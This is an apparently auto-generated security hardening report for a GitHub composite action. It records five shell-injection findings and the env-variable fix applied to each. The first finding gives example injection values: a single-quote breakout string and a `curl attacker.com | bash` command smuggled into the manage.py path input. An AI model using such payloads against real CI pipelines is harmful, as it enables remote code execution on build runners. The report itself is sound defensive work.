<!-- markdownlint-disable -->

# Hardening Report: tj-django--django-migration-fixer/v1.3.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **tj-django--django-migration-fixer/v1.3.3** was hardened automatically. 5 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The composite action's single `run:` step directly interpolates multiple `${{ inputs.* }}` expressions inside the shell script string, violating rule (a). GitHub Actions template-substitutes these values before the shell parses the script, so an attacker who controls the inputs can inject arbitrary shell commands.

1. `DEFAULT_BRANCH="${{ inputs.default-branch }}"` — attacker-controlled value injected into the shell before quoting takes effect.
2. `if [[ '${{ inputs.force-update }}' == 'true' ]]` — value injected inside single quotes; a value like `' ]]; then evil; if [[ '` breaks out of the single-quoted context.
3. `if [[ '${{ inputs.skip-default-branch-update }}' == 'true' ]]` — same single-quote bypass as above.
4. `python ${{ inputs.managepy-path }} makemigrations …` — value injected with no quoting whatsoever, enabling direct command injection (e.g. `./manage.py; curl attacker.com | bash`).

Fix: move all inputs into `env:` variables and reference them as double-quoted shell variables (`"$VAR"`), never interpolating `${{ }}` directly inside a `run:` block.

Locations:

- `action.yml:28`
- `action.yml:31`
- `action.yml:35`
- `action.yml:40`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.default-branch }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:25`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.force-update }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:29`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.skip-default-branch-update }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:33`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.managepy-path }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:37`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed all 5 findings (1 script-injection + 4 static-inline-injection) in action.yml by:
1. Adding an `env:` block to the step with four variables: INPUT_DEFAULT_BRANCH, INPUT_FORCE_UPDATE, INPUT_SKIP_DEFAULT_BRANCH_UPDATE, and INPUT_MANAGEPY_PATH — each mapped from the corresponding ${{ inputs.* }} expression.
2. Replacing all direct ${{ inputs.* }} interpolations in the run: block with double-quoted shell variable references ($INPUT_DEFAULT_BRANCH, $INPUT_FORCE_UPDATE, $INPUT_SKIP_DEFAULT_BRANCH_UPDATE, $INPUT_MANAGEPY_PATH).
3. Changed single-quoted comparisons (which were vulnerable to single-quote bypass) to double-quoted comparisons.
4. Quoted the python interpreter argument ($INPUT_MANAGEPY_PATH) to prevent word-splitting and glob expansion.
No ${{ }} expressions remain inside the run: block.

